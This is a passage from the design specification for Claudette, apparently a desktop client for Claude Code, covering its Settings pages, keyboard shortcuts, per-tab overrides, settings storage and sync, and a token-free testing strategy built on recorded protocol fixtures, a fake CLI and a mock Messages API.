| Advanced | All of it this computer's. **Running claude**: extra command-line arguments passed to `claude`, protocol logging with **Open log folder**, and Claudette's data folder. **Diagnostics**: what Claude Code sent that Claudette doesn't know, the minimum supported Claude Code version, and **Copy diagnostics** ([§16](#staying-tolerant-at-runtime)). |
| Sessions | All of it this computer's. **Session library**: the folder (with **Browse…** and **Move library…**, which copies existing sessions to the new folder), and under it what the library takes, *The library holds 1.4 GB: 23 sessions.*: every file in it but leases, scratch pads, usage and settings sync included, measured off the UI thread each time the page shows and after the folder changes. Sync new tabs to the session library (off by default; each tab can be switched with **Sync to other machines** in its menu). Name for this machine, as shown in History. **Delete sessions not used for a while** (on by default), with how many days under it (15 by default; [Keeping sessions](#session-library-sync-across-machines)). **Settings sync**: **Sync Claudette's settings through the library** (off by default), with what it copies. See [§9](#session-library-sync-across-machines) and [Settings sync](#settings-sync-optional). |
| Files and diffs | All of it this computer's. **Opening files**: **Open files in** Claudette's editor, at the line named (the default), or the app the OS uses for the file; **Show a file clicked in a conversation** beside the conversation (the default) or in its place; **Open images in** Claudette's image viewer (the default) or the OS's app ([§18](#opening-images)). **Project Files tab**: **The explorer is on the** left (the default) or right, **Wrap long lines** (off by default), and **Indent new lines with** (4 spaces by default), for files that have no indentation to go by ([§18](#project-files)). **Diff tool**: built-in, a preset or a custom command, with **Test** ([§8](#external-diff-tool)), and **Open in the diff window**: the file, as **Open files in** says (the default), the file in the app the OS uses for it, or the changes in the diff tool ([§8](#8-file-changes--diff-view)). |
| All tools | All of it this computer's. What every kind of project shares, first in **Project tools**. **Solutions**: open them with the OS's app, Rider, Visual Studio, VS Code or another program (**Browse…**). **Editor logs**: show editor logs under the tab (on by default). See [§18](#project-tools). |
| Unreal Engine, Unity, Godot | All of it this computer's. A page for each project type ([§18](#project-types)), in **Project tools**, drawn from what the type declares, with the type's icon and its line under the title. **Projects**: **Recognize Unreal Engine projects** and **Tell Claude about Unreal Engine projects** (both on by default). **Defaults**, what every project of the type starts with, when the type has settings of its own: for Unreal, the default editor configuration (Development or DebugGame) and project files for Visual Studio, VS Code or Xcode (the OS's own by default); for Unity, the default code optimization (Release or Debug); for Godot, the executable (**Browse…**, **Detect**). While a type is switched off, the rest of its page is disabled, and the sidebar says *Off* after its name. |
| Git | The first page of **Source control**, its icon a branch. **Tab rows**: **Show the git branch** (on by default, and synced, so the section has no *This computer*; [§4](#sidebar)), which was Conversation's and keeps its key, `appearance.showBranchOnTabs`. The rest is this computer's, each section saying so by its heading. **Worktrees**: remove worktrees once everything in them is merged (off), and remove worktrees no tab has used for *Never* (the default) to 90 days, with what the last cleanup removed and **Clean up now** ([§4](#cleaning-up-worktrees)), which were General's and keep their keys. **Git**: **Path to git** (`git.path`, empty by default for the first `git` on the user environment's `PATH`, with **Browse…**): every git Claudette runs is this one, from its next run, and under the box is the git found and its version, *git 2.47.1.windows.2 at C:\Program Files\Git\cmd\git.exe*, from `git --version` run off the UI thread each time the page shows and after the path changes, or, in the caution color, why it can't be used: *There's no file at that path.*, a folder, *It isn't git*, or none on the `PATH`. Its **More** says Claude's own git commands, in its Bash tool, run the git Claude Code finds, whatever it says. **Project Files tab**: **New Files tabs show** **Claude's changes** (the default) or **Changes against git HEAD**, what a Files tab compares with when it opens with nothing saved; each then changes its own from its explorer's **⋯** ([§18](#project-files)). **Files git ignores**: **Dimmed** (the default) or **Hidden**, in the explorer, outside a repository the folders the `@` list skips; a change applies to the open Files tabs at once. |
| Perforce | The second page of **Source control**, after Git; it was the last of **Project tools** until Source control was made. All of it this computer's. **Logins**: Keep Perforce logins fresh (off by default), the password source, **Renew the ticket when less is left than (minutes)**, **Request tickets valid on all hosts** (`p4 login -a`), and show changelist on tabs. **Opening files in Perforce** (each on by default, in a workspace only; [§18](#opening-files-in-perforce)): **Check out files before they're changed**, **Add new files**, **Mark deleted files for delete**, **Rename with p4 move** and **Show Perforce state in the Files tab**. **Stored password**: a password for a server and user (**Save password** / **Forget password**). **Per-folder server and user**. See [§18](#perforce-ticket-handling). |

### Keyboard shortcuts

Settings → Keyboard lists every shortcut Claudette handles, with its default from the section that describes it: new tab, close tab, next and previous tab, go to tab 1–9, History, Settings, collapsing the sidebar, Stop, the quick suffixes menu, stashing the message (`Ctrl/Cmd+S`, [§5](#drafts-and-the-stash)), allowing or denying the waiting prompt, running the project's main action (`Ctrl/Cmd+Shift+E`, [§18](#project-tools)), finding in the conversation (`Ctrl/Cmd+F`, [§5](#find)), going to the previous and next message in it (`F3` and `F4`) and to its first and latest (`Ctrl/Cmd+F3`, `Ctrl/Cmd+F4`, [§18](#conversation-cards)), going to the next tab waiting for you (`Ctrl/Cmd+J`, [§4](#4-tabs--sessions)), the command palette (`Ctrl/Cmd+Shift+P`, [§4](#command-palette)), zooming in, out and back to 100% (`Ctrl/Cmd +`, `−` and `0`, [§3](#accessibility)), going to a file in the project (`Ctrl/Cmd+P`, [§18](#project-files)), and finding and replacing in the project's files (`Ctrl/Cmd+Shift+F` and `Ctrl/Cmd+Shift+R`, [§18](#project-files), "Finding in files"). Its fixed keys include the Project Files tab's editor's own ([§18](#project-files), "Keyboard"). A shortcut on a digit, `+` or `−` also answers to the number pad's key.

- **Rebinding.** Click a shortcut and press the new keys; Esc cancels. **Reset** puts one back, **Remove** clears it, and the **Shortcuts** section's **Reset to defaults** restores them all.
- **One key for both OSes.** Shortcuts are stored with a *Primary* modifier: Ctrl on Windows and Linux, Cmd on macOS. That way a shortcut synced between a Windows machine and a Mac means the same thing on both. Ctrl is its own modifier only on macOS; elsewhere it is Primary.
- **Refused shortcuts.** A shortcut already used by another command or a quick suffix is refused, and the row names the conflict. So is a letter, digit or punctuation key without Ctrl, Alt or Cmd, since it would get in the way of typing. Escape, Tab, Enter, Backspace, Delete and function keys are allowed on their own.
- **Go to tab 1–9** is one shortcut for all nine digits; rebinding it takes any digit and keeps its modifiers.
- **Send with**, at the top of the page: **Enter, with Shift+Enter for a new line** (the default), or **Ctrl+Enter, with Enter for a new line** (`⌘↩` on macOS), for messages with many lines. The composer's placeholder says which, and so does the send key chip before **Send** in every tab's composer bar, which switches it with a click ([§5](#composer)); **Send**'s tooltip names the key too. `Ctrl/Cmd+Enter` also answers the waiting prompt ([§7](#7-permission-prompts)): with it as the send key, it sends what's typed in the composer, and with nothing typed it answers the prompt. It syncs with the shortcuts.
- **Fixed keys**, listed on the page but not rebindable: `Ctrl/Cmd+Shift+V` in the composer pastes text as it is, however long ([§5](#attachments)); in the new tab picker and the quick suffixes menu, 1–9 pick an entry.
- **Quick suffixes** each get their own optional shortcut, on the same page ([§5](#quick-suffixes)), checked for conflicts the same way.
- Tooltips and the composer's placeholder show the current shortcuts.

### Search

The box above the pages finds settings by their title, by the line under it and what's behind **More**, by other words for them ("dark mode" finds **Theme**, "caffeinate" **Keep this computer awake**), and by their page's and section's names. Every word typed has to be there. It lists each setting or section found with where it is, *Appearance → Look*: first those whose title has the words, then those with the words together, then the rest, in the sidebar's order. Picking one shows its page, scrolls to it and picks it out for two seconds; one shown only in some states, such as a custom diff tool's command, is brought into view by the row it's under. It finds the project's pages too, named with their group ("NightOwl → Links"), by what's on them ("web links", "add an action", "engine", "editor configuration") or by the project's name. A group's name finds its pages' settings: "project tools" finds All tools' and each kind of project's, and "source control", "version control" or "vcs" finds Git's and Perforce's.

The search entries come from the settings each page declares, so there's no separate list to keep up: a page declares each setting with its key (its path in `settings.json`, such as `appearance.theme`), its title, its line and its **More**, and its row in the page's view names that key. The row takes its words, its marks and its **Reset** from the page. A test renders every page and checks that each entry has its row, and each row its setting.

### The project's pages

At the foot of the sidebar, above the version, a group for the selected tab's project, so it stays in view however far the pages above scroll. It sits under a line across the sidebar and is headed by *Selected project* in small muted text, then the project's name when its project type found one ("NightOwl"), otherwise the folder's name, after a dot in the color of the tab's group in the main window ([§4](#4-tabs--sessions)), as that sidebar draws the group; the name's tooltip is the folder's path. It has three pages, **Links**, **Actions** and **Tools**, and resolves [issue #9](https://github.com/dotBunny/Claudette/issues/9) (adding web links from Settings). They're a list of their own, but the arrow keys carry on between the lists: Down from the last of the pages above picks **Links**, and Up from **Links** goes back. While the search box lists results, the group is hidden with the pages.

- **Which tab.** The group follows the tab selected in the main window, changing as another is selected while Settings is open, and each page says so in a small line at the top: "For the tab in D:\Games\NightOwl". With no tab open, the group is hidden. **Open** in another tab's **Tab settings…** shows that tab's.
- **Saving.** Like the rest of Settings, a change is saved as it's made: each add, edit, removal or move rewrites the file it belongs to, and every tab in the folder reads its files again, so the project's menu follows at once. Each page says that saving rewrites the file, so comments in it are dropped. A file that isn't valid JSON is never rewritten: the page shows its reason and the dialogs refuse to save to it. When a save fails, the page says why and goes back to what the files hold.
- **Links.** The links of both files in the order the project's menu shows them, `claudette.json`'s first, each with its name, its address and its file: "Shared (claudette.json)" or "Just me (claudette.local.json)". A link the menu won't open is listed with why, and one that can't be read with its reason (it can only be removed). **Add…**, **Edit…**, **Remove**, **Move up** and **Move down**; a link moves within its own file. **Add a link…** in the project's menu opens Settings on this page with a new link started. The dialog has the name (empty shows the address), the address, and for a new link which file it goes in, just the user's by default. The address is checked as the menu opens links: only `https`, `http` and `mailto`, a full address, and only the placeholders, which a one-line hint explains: `{branch}`, `{changelist}` and `{folderName}` are filled in from the tab ([§18](#project-tools)).
- **Actions.** The actions editor that was in **Tab settings…**: a choice of the two files, and the chosen file's actions with **Add…**, **Edit…**, **Remove**, **Move up**, **Move down** and **Open file**. The one change is that each edit saves as it's made (see **Saving**), where Tab settings waited for Apply. **Add an action…** in the project's menu opens Settings on this page with a new action started, its dialog asking which file it goes in. **Tab settings…** keeps a line, **Project actions**: "In Settings → NightOwl → Actions.", with **Open**.
- **Tools.** This machine's choices for the tab's project, the same ones the project menus make, and only those its project type has: the project, when the folder has several; the per-project choice (Unreal's editor configuration, Development or DebugGame; Unity's code optimization, Release or Debug); and what's picked with **Choose…** (Unreal's engine folder, the Unity editor, the Godot executable), with what's in use now, whether it was chosen or found, and **Clear** to forget the pick and find it again. It shows the project file or folder they're remembered by. Without a project it says "No project Claudette knows in this folder." It links to the defaults every project starts with: its project type's page in Project tools (**Open Unreal Engine**), or All tools without a project.

### Version

The foot of the Settings sidebar shows which Claudette this is, on every page: "Claudette 0.1.0", with **Help** (a question mark) beside it, whose menu has **User Guide**, **Ask on Discord**, **Report an issue** and **About Claudette**.

- **The version** is the one being worked on, set in `Directory.Build.props` and tagged `vX.Y.Z` when it's released ([§2](#updating-claudette)); releases pass it to the build too. The first release is `v0.1.0`.
- **A source build** ([§9](#working-on-claudette)) adds the commit it was built from ("Claudette 0.1.0 · 842169b"), taken from the informational version the .NET SDK writes from the checkout, so a build of a checkout can be told from the release with the same version. Its tooltip also says which configuration it was built in, from the assembly's configuration attribute: "Claudette 0.1.0 (source build 842169b), a Debug build from this checkout." An installed Claudette shows only the version.
- **Clicking it** copies the versions for a bug report, one per line, and it says "Copied" for two seconds: Claudette's version and how it was installed (MSIX, `.dmg`, source build and its commit), Claude Code's version, the OS and its runtime identifier, and the .NET runtime. Only versions: never paths, names or account details, since it's meant to be posted. **Copy diagnostics** ([§16](#staying-tolerant-at-runtime)) starts with the same Claudette line.
- **User Guide** opens the user guide in the browser, at https://claudette.dotbunny.com/guide/ ([User Guide](#user-guide)).
- **Ask on Discord** opens dotBunny's Discord in the browser, for questions about Claudette, through https://claudette.dotbunny.com/discord/, which forwards to the invite ([User Guide](#user-guide)). Bugs still go to GitHub, where they're tracked, and the guide's Reporting an issue page says which is for what.
- **Report an issue** opens a new issue on Claudette's GitHub repository in the browser, with an outline (what happened, what you expected, steps to reproduce) and the same versions filled in. Nothing is sent until the user submits it there.
- The command palette has the same three under **Help** ([Command palette](#command-palette)), and so does the macOS **Help** menu ([Opening a tab](#opening-a-tab)).
- **About Claudette** opens the About page ([About](#about)).

### About

✅ Built 2026-10-25, as the last page of Settings' **Claudette** group; a window of its own since 2026-10-29. **About Claudette**: which Claudette this is, who has contributed to it, whose names it uses, and the licenses of what it ships, under Claudette's logo and name. It opens over the window it was opened from, which waits until it's closed (`Esc` closes it): from **About Claudette** in the header's menu, in **Help** at the foot of Settings' sidebar, first in the macOS app menu, and last in the command palette's **Help**. One at a time; opened again, it comes forward. It isn't in Settings, nor found by its search. How it's built: `Views/AboutWindow`, showing `AboutPage` (still a `SettingsPage`, so `Views/Settings/AboutPageView` draws its sections with the settings controls).

- **Claudette.** The version, as at the sidebar's foot ([Version](#version)); **On the web**: **Website**, **Source code**, **Changelog** and **Privacy policy**, in the browser; and **MIT License**, with the copyright the build gives the app (`Directory.Build.props`) and **License**, which shows the repository's `LICENSE` under the row.
- **Contributors.** ✅ Built 2026-10-29. A row for each person outside dotBunny whose work is in Claudette, in the order they first contributed: their name, what they brought in a line, and **GitHub** (their profile) and **Pull requests** (theirs to Claudette), in the browser. Under the heading: *The people outside dotBunny whose work is in Claudette, and what each brought. Thank you.* The list is kept in the source (`AboutPage.ContributorList`), not read from git or GitHub: a fork's commits often carry GitHub's private noreply addresses, and what someone brought reads better in words. Merging a pull request from someone new adds them, in the same change or the one after.
- **Trademarks.** A row for each name Claudette uses, with its owner's notice: Claude and Claude Code (Anthropic), Godot and the Godot logo (the Godot Foundation; the logo is by Andrea Calabró, under CC BY 4.0), Unity (Unity Technologies), Unreal, Unreal Engine and the Unreal Engine logo (Epic Games, in the words Epic's guidelines require; the logo with its permission), and Perforce, P4V and the Perforce logo (Perforce Software; the logo with its permission). Under the heading: dotBunny makes Claudette, none of them sponsors, is affiliated with or endorses it, and other names are their owners' trademarks. The site's footers say the same ([User Guide](#user-guide)). A logo is shown only where its owner allows it, and named here: the Godot Foundation's trademark policy lets anyone refer to Godot with its logo, and Perforce and Epic allowed theirs as their guidelines say, while Unity's guidelines ask for its written permission, so until it gives it, Unity's project type keeps an icon Claudette draws ([Project types](#project-types)).
- **Perforce's logo.** Its symbol is Settings → Perforce's icon in the sidebar, and the whole logo, the symbol and the word *perforce*, is the page's title in place of its name, which a screen reader still reads. Perforce allowed it on the terms of its brand guidelines ([perforce.com/resources/brand-guidelines/logos](https://www.perforce.com/resources/brand-guidelines/logos)), which these follow: the artwork of Perforce's corporate logo, unchanged; only Perforce's colors, in full color (the symbol indigo, `#4C00FF`, and the word navy, `#00003A`) in the light themes and white (`#F6F9FD`, its reversed logo's) in the dark ones, in both styles, where Claudette's own icons follow the theme, except that the sidebar's symbol is in Perforce's mono black (`#000000`) in the light themes until its page is selected, so it sits with the gray icons around it; no tile, outline or effect; and the logo at least 110 pixels wide (128 here), with clear space of half its height around it. The sidebar's symbol is 14 pixels wide, under the guidelines' 40, as Claudette's request to Perforce described. The site shows it by the same rules ([User Guide](#user-guide)).
- **Unreal Engine's logo.** Epic's icon is Unreal Engine's project type's icon, on its page in Settings' sidebar and as the project's icon on its group's row in the main sidebar, and Epic's horizontal logo, the icon and *UNREAL ENGINE*, is Settings → Unreal Engine's title in place of its name, which a screen reader still reads. Epic allowed it on the terms of its guidelines ([brand.epicgames.com/document/383](https://brand.epicgames.com/document/383#/logos/unreal-engine-logo)), which these follow: the artwork from Epic's Brand Hub, unchanged; only Epic's black, in the light themes, or its white, in the dark ones, in both styles and selected or not, never the theme's or the accent; and Epic's notice, worded as it requires, in About and the site's footers. The title's logo has the clear space Epic asks for, its height above and below and twice that beside it. The icon is 14 pixels in Settings' sidebar and on the group's row, under the guidelines' 16, and the rows leave it less clear space than its height: Epic allowed both in writing (2026-10-26), so it fits Claudette's rows as the other icons do. The landing page's Unreal Engine card has the icon in place of its tile, and the guide's Unreal Engine page the logo for its title ([User Guide](#user-guide)).
- **Godot's logo.** Its monochrome icon is Godot projects' icon (above), and its whole logo, the small horizontal one from its press kit (godotengine.org/press, for less than 100 pixels tall), is Settings → Godot's title, 91 pixels wide, in its colors: the head blue, its eyes and jaw's line white, and the word dark grey in the light themes and light in the dark ones, as the press kit's two versions have it. Its press kit asks only that it isn't distorted and doesn't suggest Godot's makers endorse Claudette; the logo is CC BY 4.0, credited in About's licenses. The landing page's Godot card has its icon, in color on a light page and all white on a dark one, as its press kit's monochrome logo for a dark background is, and the guide's Godot page the logo for its title.
- **Open-source licenses.** Everything Claudette ships that someone else made, by name: each package the build copies beside the app (Core's, Usage's and Platform's included), and what isn't a package: the .NET runtime, Inter (the interface's font, in Avalonia's font package) and Godot's logo. Each row has its name and version, its license and copyright, **Website**, **License** (its text under the row, or for a license that asks only for a link, CC BY, its page in the browser) and, when its package carries them, **Notices**: the third-party notices of what it's built from in turn. A long text scrolls on its own, so the page stays a list.
- **Made by the build.** `ThirdPartyNotices.targets` reads the nuspec of each package the build copies: its license expression or file, its copyright and its repository. The package's own license file comes first, since it names the holders; otherwise the license's text from `src/Claudette.App/Licenses/`. Its `THIRD-PARTY-NOTICES` file comes too, each text kept once however many packages share it. `Licenses/extras.xml` adds what isn't a package, and names the license of a package that only points at a file. The result, `ThirdPartyNotices.xml`, is embedded in the app, so the list is always the build's. A package whose license has no text in `Licenses/`, or that doesn't say its license, fails the build, so a new one is looked at before it ships. AvaloniaUI's diagnostics, in Debug builds only, is left out.

### Per-tab overrides

Some settings can be changed for a single tab from the tab's right-click menu, under **Tab settings…**, a dialog over the main window drawn with the same sections and rows as Settings:

- **Model and mode**: model, effort level, permission mode and **Subagents** (Default, Claude decides, Discourage them or Don't allow them; [§5](#subagents)).
- **At a usage limit**: **Continue tasks when a usage limit resets** (Default, On or Off; [§6](#continuing-after-a-limit-resets)) and **Use usage credits** (Default, On or Off, on the Default account; [§6](#tabs-that-dont-use-usage-credits)).
- **Check-ins on long turns**: **Use different check-ins for this tab**, then the check-in settings.
- **Process monitor**: **Show the process monitor** (Default, On or Off; [§4](#process-monitor)).

Each change applies as it's made, as in Settings, and is saved with the tab: a new model, effort level or mode goes to the running session straight away. A row that differs from Settings has the changed bar, and each section's **Use defaults** puts only its own back. **Done**, or Esc, closes it. A tab with overrides shows a small dot next to its settings entry, and the settings it overrides say so in Settings ([above](#14-settings)).

A last section, **This tab**, has **Sync to other machines** ([§9](#session-library-sync-across-machines)) and **Connect to the Claude app** ([§18](#remote-control-the-claude-app)), the same switches as the tab menu's, the tab's **Extra folders** ([§4](#4-tabs--sessions)), and where its project's actions are edited. None of them is an override: the new-tab settings only apply when a tab opens, they have no **Use defaults**, and they don't count toward the dot. The extra folders apply when the dialog closes, since Claude Code starts again to use them. The folder's custom project actions belong to the folder, not the tab, so they're edited in Settings, on the tab's **Actions** page ([above](#the-projects-pages)).

### Storage

- Claudette's settings are stored as JSON in the app data folder: `%APPDATA%\Claudette\settings.json` on Windows, `~/Library/Application Support/Claudette/settings.json` on macOS, and `~/.config/claudette/settings.json` on Linux.
- Everything else Claudette keeps on this machine (the saved tabs and `state.json`, `usage.db`, the logs, the default session library, the copies a source build runs from) is in its data folder: `%LOCALAPPDATA%\Claudette` on Windows, `~/Library/Application Support/Claudette` on macOS and `~/.local/share/claudette` on Linux (`AppPaths`).
- Settings files have a version number so later releases can migrate them.
- Claudette's files are written whole or not at all: to a temporary file next to the real one, flushed to the disk, then renamed over it (tried again for up to about two seconds while something else, such as an antivirus scanner or a backup, has the file open). A crash or a power cut leaves the old file or the new one, never half of one.
- A settings or state file that isn't valid JSON is kept next to it as `<name>.<time>.bad`, and Claudette starts from defaults. One that can't be read at all (still in use after the retries, or not permitted) is left alone: Claudette starts from defaults for this run but doesn't save over it, so it's back at the next launch.
- Claudette's settings are separate from Claude Code's. Claudette doesn't edit `~/.claude/settings.json` or a project's `.claude/` settings except where this document says it does.

### Settings sync (optional)

**Sync Claudette's settings through the library** (Settings → Sessions, off by default) keeps Claudette's settings the same on every machine that uses the same library folder ([§9](#session-library-sync-across-machines)).

- **What syncs:** appearance (but not **Zoom**), most of Conversation and Git's **Show the git branch**, what new tabs start with (but **Subagents**), usage settings (thresholds, continuing when a limit resets, using usage credits, and sharing usage with other machines), check-ins, quick suffixes, notifications, keyboard shortcuts (and **Send with**) and process monitor options. A setting that doesn't says *This computer* in Settings ([§14](#14-settings)).
- **What stays on each machine:** whether Claudette starts at login (the OS keeps it, [§9](#starting-at-login)), the zoom (it suits the machine's screen, [§3](#accessibility)), Settings → Files and diffs (the editor's settings and the diff tool, [§18](#project-files)), Settings → Claude Code (the path to `claude`, the login shell setting, the Claude app settings and the rest), the rest of Settings → Git (the path to `git`, cleaning up worktrees and the Files tab's choices), this machine's name, the library folder itself, Settings → Project tools (program paths and installed IDEs differ between machines), recent and favorite folders, folder mappings, pinned tabs, window sizes and positions, the sidebar's and the usage header's collapsed or detailed state, and the Perforce settings (servers, workspaces and stored passwords belong to the machine). A stored Perforce password is never in `settings.json` at all ([§18](#perforce-ticket-handling)). The main window comes back where it was, with its size and maximized state, unless that position is no longer on a screen (a monitor unplugged since), when the OS places it.
- The synced settings are stored as one file in the library. Each setting keeps the time it was last changed, and the newest change wins, so edits on two machines don't overwrite each other wholesale.
- The first time sync is turned on and the library already has settings from another machine, Claudette asks: **Use synced settings** or **Replace them with this machine's**.
- Turning sync off keeps the current values on this machine and stops syncing.
- **When it syncs.** At launch, after each settings change, and once a minute to pick up changes from other machines.
- **How it merges.** Each setting is a path such as `appearance.theme`; lists such as the quick suffixes sync as one value. Claudette remembers the value and time it last saw or published for each path.
  - A local edit is published with the current time.
  - A newer synced change is applied here.
  - When both changed, the newer one wins.
  - Equal values are never a conflict.
- Notification settings sync, and so do keyboard shortcuts.

## 15. Testing

The whole test suite runs without an Anthropic account and without using any tokens. Only a small, opt-in live suite talks to the real service.

### Design rules that make this possible

These apply from milestone 1:

- `ClaudeSession` talks to Claude Code only through `IClaudeTransport`, never directly to a process, so tests can swap in a fake.
- Processes are started through `IProcessLauncher`, so tests can check the exact command line and environment, and fake the process.
- All time-based code (burn rate, check-ins, leases, usage retention, update checks, service status checks, sampling) uses .NET's `TimeProvider`. Tests move the clock forward with `FakeTimeProvider` instead of waiting.
- File locations (app data, the session library, Claude Code's config folder) are injected, so tests use temporary folders.
- The compiler checks the first three, and that web requests go through `AppServices.Http` and child environments aren't set on Claudette's own: `src/BannedSymbols.txt` lists what code under `src/` can't call (`Microsoft.CodeAnalysis.BannedApiAnalyzers`). The one place that has to, such as `ProcessLauncher` starting processes, says why with `#pragma warning disable RS0030`. `.editorconfig`'s warnings are checked by the build too (`EnforceCodeStyleInBuild`): unused usings, private members and parameters, fields that could be readonly, and the naming of fields (`_camelCase`, and PascalCase for constants and static readonly ones). Doc comments are checked as well, for a `cref` or `param` that names nothing.

### Test layers

| Layer | What it covers | How | Tokens |
|---|---|---|---|
| Unit | Pure logic: burn rate and projection, check-in timers, usage retention, settings sync merging, suffix composition, diff command templates, recent folders, tab grouping, project identity matching, lease files | Plain unit tests with a fake clock and temporary folders | None |
| Protocol replay | Turning Claude Code's output into events, and what Claudette writes back: messages, interrupts, permission replies, model and effort changes | Recorded stream-json traffic from real sessions, checked in as fixture files and replayed through a fake transport | None |
| Fake CLI | Process handling: launch flags, stdin/stdout, interrupts, crashes, hangs, sign-in failures, `--version` and `doctor` output, child processes for the process monitor | A small `fake-claude` test program that speaks the stream-json protocol, scripted by the prompt and environment variables. Claudette points at it through the "path to `claude`" setting. | None |
| Real CLI, fake model | End to end against the real `claude` binary: real tools, permission prompts, file edits, transcripts and resume | A local mock server that implements the Anthropic Messages API and returns scripted replies. `claude` points at it with `ANTHROPIC_BASE_URL` and a dummy `ANTHROPIC_API_KEY`. | None |
| UI | View models, and views: sidebar, composer, chips, permission cards, meters | View-model tests with no UI; Avalonia.Headless for rendering and input; snapshot tests with Verify. A snapshot is a text form of what a view shows (text, buttons, fields, meters, images by their accessible name, in tree order), not pixels, so it reads the same on every OS and only changes when what the user sees changes. | None |
| Live (opt-in) | What only the real service can confirm: `rate_limits` data, sign-in, real model output | Tests tagged `Live`, excluded by default and run manually before a release | A few cents |

### Protocol fixtures

- Recorded from real sessions by a **record** mode, from a protocol log ([§13](#logging)):
  - `ProtocolRecordingTests` (`RealCli`, against the mock Messages API, so no tokens) and the Live suite write fixtures when `CLAUDETTE_RECORD_FIXTURES` names a folder.
  - A developer session with protocol logging turned on: `dotnet run --project tools/Claudette.Fixtures -- <protocol.log> <fixture.jsonl> --root <project folder>`.
- Before they're checked in, they're cleaned of paths (under the given roots, the home folder, and Claude Code's path-named project folders), emails, account details and session IDs (`session-1`, `session-2`…). The cleaning doesn't cover what prompts or files said, so check a fixture before committing it.
- Stored under `tests/Claudette.Core.Tests/Fixtures/protocol/<claude-code-version>/`. Every fixture must parse with no unknown message types or fields (`MessageParserTests`).
- Scenarios covered (2.1.284):
  - A simple reply with streaming text (`01-mock-basic`).
  - Tool calls: a write allowed through the control protocol (`02`), an edit with its original file (`06`), and accepting edits mid-turn (`03`).
  - Subagents (`12-subagents`: two in parallel, one nested, and a permission prompt from inside one).
  - A permission prompt that is denied (`07-permission-denied`).
  - An interrupt (`08-interrupt`).
  - `rate_limit_event` in its API-key form, with only `status`, in every recording since `07`; and an authentication failure (`signed-out`).
  - `/clear` (`09-clear`), compaction (`10-compact`) and API errors retried (`11-api-retry`, from the mock's `API_ERROR`).
- When a new Claude Code version comes out, recording the same scenarios again and diffing them against the old fixtures shows protocol changes before users hit them.

### Fake CLI (`fake-claude`)

- The prompt picks what the fake does, rather than a scenario file: `ASK_PERMISSION`, `SLOW` (streams for about 10 seconds), `CRASH` (exit code 7), `SPAWN [seconds] [busy]` (a child process that outlives the turn, for the process monitor), `SILENT` (quiet until a message arrives mid-turn, as a check-in does, then answers with a status), `HANG` (ignores everything until interrupted) and `AUTH_FAIL`. Environment variables set its version, sign-in, `doctor` and `update` output, and `get_usage` answers; the header of its `Program.cs` lists them.
- It also answers the other commands Claudette runs: `--version`, `auth status`, `auth login` (with a fake browser step), `doctor` and `update`. That covers sign-in and update handling without the real CLI.

### Real CLI against a fake model

- The mock server implements the API format Claude Code expects from an LLM gateway, including streaming.
- Each test scripts the model's side. For example: "reply with a `tool_use` for Edit on `a.txt`, then a short summary."
- Claude Code then runs the real tool against a temporary git repo, so permission prompts, diffs, "before" snapshots, transcripts and `--resume` are all tested for real.
- Every test runs `claude` with:
  - `CLAUDE_CONFIG_DIR` set to a temporary folder, so it never touches the user's `~/.claude` settings, sessions or credentials.
  - `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`, so there's no auto-update or telemetry.
- API-key mode doesn't produce subscription `rate_limits` data. The usage meters are covered by protocol fixtures instead.
- These tests need Claude Code installed, so they're tagged `RealCli`. CI installs Claude Code before running them.

**Confirmed by the spike** (Claude Code 2.1.284): the real `claude` runs complete sessions against a local mock server with a dummy key. It calls three endpoints:

- `HEAD /api/hello`, a connectivity check.
- `POST /v1/messages?beta=true`, streaming.
- `POST /v1/messages/count_tokens?beta=true`, for context usage.

Tool calls, permission prompts, file edits, interrupts, model and effort changes, titles and resume all worked with no tokens used. Two things to note:

- The test runner must launch `claude` with a clean environment, the same as the app ([§13](#integration-with-claude-code)).
- Each request carries the settings in effect, such as `model` and `output_config.effort`, so tests can check that those changes reached the API.

The spike's Node scripts (a mock Messages API, a stream-json driver and the scenarios that were run) are kept in [`spikes/`](spikes/README.md). They're a working reference for the protocol until the .NET harness replaces them.

### Live suite

- A handful of tests using the cheapest settings: Haiku, low effort, one-line prompts (`LiveTests`, tagged `Live`).
- Runs with a separate API key that has a spend limit, not someone's personal subscription: `CLAUDETTE_LIVE_API_KEY`.
- What an API key can't show (`get_usage`'s plan limits and the account) comes from a signed-in Claude Code config folder, `CLAUDETTE_LIVE_CONFIG_DIR`. Those checks make no model calls.
- Each test skips when its variable isn't set. Also used to record new protocol fixtures (`CLAUDETTE_RECORD_FIXTURES`).

### Tools and CI

- xUnit v3, Avalonia.Headless.XUnit, Verify (snapshot testing, `Verify.XunitV3`) and Microsoft.Extensions.TimeProvider.Testing (`FakeTimeProvider`). xunit.v3 stays on 3.2.x until Avalonia.Headless.XUnit supports 4.x, and so Verify.XunitV3 stays on 32.0.x, the last built against it.
- GitHub Actions (`.github/workflows/ci.yml`):
  - A build-and-test job on Windows, macOS and Linux runs everything except `Live`, for every push and pull request. Only Linux runs the `RealCli` tests: it installs Claude Code first (tried three times), at `lastTested` from `compat/surface.yaml` so a new release can't turn a pull request red, and sets `CLAUDETTE_REQUIRE_CLAUDE=1`, so a `RealCli` test that can't find Claude Code fails rather than skips and the leg can't pass while running none. Running them on the same runner saves a second restore and build. The daily compatibility check tries new releases and the minimum version ([§16](#daily-compatibility-check)).
  - A test that hangs fails its job after 10 minutes, naming the test (`--blame-hang-timeout`), and no job runs longer than 30 minutes. A newer push to a pull request cancels its running checks.
  - Packages are restored exactly as each project's `packages.lock.json` says (`--locked-mode`), and cached by those files. A package change updates the lock files when restored locally; commit them with it.
  - Each job's summary page lists its test counts per assembly and its failures. A failed job keeps its test results, the blame files naming a hung test, and any changed view's `*.received.txt` as an artifact for a week.
  - Coverage isn't measured in CI, to keep its minutes down; run it locally (`CLAUDE.md`, "Commands").
- Dependabot (`.github/dependabot.yml`) opens one pull request a month for NuGet packages and one for GitHub Actions, each grouping every update. It leaves xunit.v3 and xunit.runner.visualstudio below 4 and Verify.XunitV3 below 33, for the reason above. Workflows pin actions by commit, with the version in a comment.

### Where things are

| Piece | Location |
|---|---|
| Fake transport and replay transport | `tests/Claudette.Core.Tests/Support/` |
